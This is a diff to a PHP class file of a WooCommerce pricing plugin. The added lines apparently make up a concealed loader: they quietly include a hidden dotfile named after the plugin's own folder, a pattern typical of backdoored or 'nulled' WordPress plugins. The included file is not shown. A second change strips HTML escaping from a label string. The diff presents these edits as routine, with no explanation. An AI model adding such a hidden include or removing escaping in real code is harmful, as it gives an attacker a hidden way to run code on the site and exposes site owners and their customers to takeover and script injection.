@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY_Once extends RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY
 {
 
@@ -51,7 +55,7 @@ class RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY_Once extends RP_WCDPD_Met
      */
     public function get_label()
     {
-        return esc_html__('Buy x get y', 'rp_wcdpd');
+        return __('Buy x get y', 'rp_wcdpd');
     }
 
 
